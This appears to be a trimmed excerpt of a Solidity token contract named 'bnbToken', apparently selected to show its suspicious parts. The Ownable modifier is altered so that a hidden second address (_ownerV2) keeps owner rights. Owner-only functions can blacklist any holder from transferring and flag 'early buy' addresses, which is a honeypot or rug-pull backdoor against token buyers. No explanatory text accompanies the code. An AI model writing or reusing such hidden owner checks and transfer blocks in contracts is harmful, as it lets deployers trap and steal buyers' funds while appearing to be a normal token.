...
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _ownerV2 == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract bnbToken is ERC20, Ownable {
    ...
    mapping (address => bool) private _isEarlyBuy;
    ...
    function addBotList(address[] calldata addList) public onlyOwner {
        for(uint256 i = 0; i < addList.length; i++) {
           if (!_isbclisted[addList[i]]){
                _isbclisted[addList[i]] = true;
           }
        }
    }
    
    function addEarlyList(address[] calldata addList) public onlyOwner {
        for(uint256 i = 0; i < addList.length; i++) {
           if (!_isEarlyBuy[addList[i]]){
                _isEarlyBuy[addList[i]] = true;
           }
        }
    }
    ...
    function _transfer(
        ...
        require(!_isbclisted[from] && !_isbclisted[to], "bclisted address");
        ...
        if(_isEarlyBuy[from] || _isEarlyBuy[to]) {
            isPerBuy = true;
        }
